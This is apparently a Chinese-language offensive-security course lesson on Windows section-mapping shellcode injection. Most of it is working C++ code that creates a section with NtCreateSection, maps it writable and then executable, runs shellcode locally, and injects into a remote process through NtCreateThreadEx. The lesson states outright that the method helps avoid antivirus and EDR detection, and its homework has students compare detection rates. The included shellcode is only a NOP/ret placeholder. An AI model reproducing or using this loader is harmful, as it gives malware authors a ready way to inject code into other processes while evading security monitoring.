# 课时07：映射注入执行ShellCode

## 1. 课程概述

### 1.1 学习目标

- 理解Windows内存映射机制
- 掌握Section映射注入技术
- 学会使用NtCreateSection/NtMapViewOfSection
- 理解如何绕过常见内存分配检测

---

## 2. 名词解释

| 术语 | 说明 |
|------|------|
| **Section** | Windows内存映射对象，可在进程间共享 |
| **View** | Section在进程地址空间的映射 |
| **NtCreateSection** | 创建Section对象 |
| **NtMapViewOfSection** | 将Section映射到进程地址空间 |

### 2.1 与VirtualAlloc的区别

| 特性 | VirtualAlloc | Section Mapping |
|------|--------------|------------------|
| 检测级别 | 高 | 较低 |
| 跨进程 | 需要WriteProcessMemory | 原生支持 |
| 内存类型 | Private | Mapped |

---

## 3. 实现代码

### 3.1 本地映射注入

```cpp
#include <windows.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90,  // nop sled
    0xC3                     // ret
};

int main() {
    printf("========== Section Mapping Injection ==========\n");
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    pNtCreateSection NtCreateSection = 
        (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = 
        (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    
    // 创建Section
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize = { sizeof(shellcode) };
    
    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &sectionSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL
    );
    
    if (status != 0) {
        printf("[-] NtCreateSection failed: 0x%X\n", status);
        return 1;
    }
    printf("[+] Section created\n");
    
    // 映射到本进程 (可写)
    PVOID pLocalView = NULL;
    SIZE_T viewSize = 0;
    
    status = NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &pLocalView,
        0, 0, NULL,
        &viewSize,
        2,  // ViewUnmap
        0,
        PAGE_READWRITE
    );
    
    if (status != 0) {
        printf("[-] Local mapping failed: 0x%X\n", status);
        CloseHandle(hSection);
        return 1;
    }
    printf("[+] Local view at: 0x%p\n", pLocalView);
    
    // 写入ShellCode
    memcpy(pLocalView, shellcode, sizeof(shellcode));
    printf("[+] ShellCode written\n");
    
    // 重新映射为可执行
    PVOID pExecView = NULL;
    viewSize = 0;
    
    status = NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &pExecView,
        0, 0, NULL,
        &viewSize,
        2,
        0,
        PAGE_EXECUTE_READ
    );
    
    if (status != 0) {
        printf("[-] Exec mapping failed: 0x%X\n", status);
        CloseHandle(hSection);
        return 1;
    }
    printf("[+] Executable view at: 0x%p\n", pExecView);
    
    // 执行
    printf("[*] Executing ShellCode...\n");
    ((void(*)())pExecView)();
    
    printf("[+] Done!\n");
    CloseHandle(hSection);
    return 0;
}
```

### 3.2 远程进程映射注入

```cpp
// 注入到远程进程
BOOL InjectToProcess(DWORD pid, PBYTE shellcode, SIZE_T size) {
    // 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;
    
    // 创建Section
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize = { size };
    
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
                    &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    
    // 映射到本地(可写)
    PVOID pLocal = NULL;
    SIZE_T viewSize = 0;
    NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocal,
                       0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
    
    // 写入ShellCode
    memcpy(pLocal, shellcode, size);
    
    // 映射到远程进程(可执行)
    PVOID pRemote = NULL;
    viewSize = 0;
    NtMapViewOfSection(hSection, hProcess, &pRemote,
                       0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READ);
    
    printf("[+] Remote view at: 0x%p\n", pRemote);
    
    // 创建远程线程执行
    HANDLE hThread = NULL;
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                     pRemote, NULL, 0, 0, 0, 0, NULL);
    
    CloseHandle(hProcess);
    CloseHandle(hSection);
    return TRUE;
}
```

---

## 4. 免杀优势

- 不使用VirtualAllocEx
- 不使用WriteProcessMemory
- 内存类型为Mapped而非Private
- 共享内存不容易被检测

---

## 5. 课后作业

1. 实现本地Section映射执行ShellCode
2. 实现跨进程的映射注入
3. 对比VirtualAlloc与Section映射的检测效果

---

## 6. 下一课预告

下一课我们将学习**“进程挂起注入执行ShellCode”**。
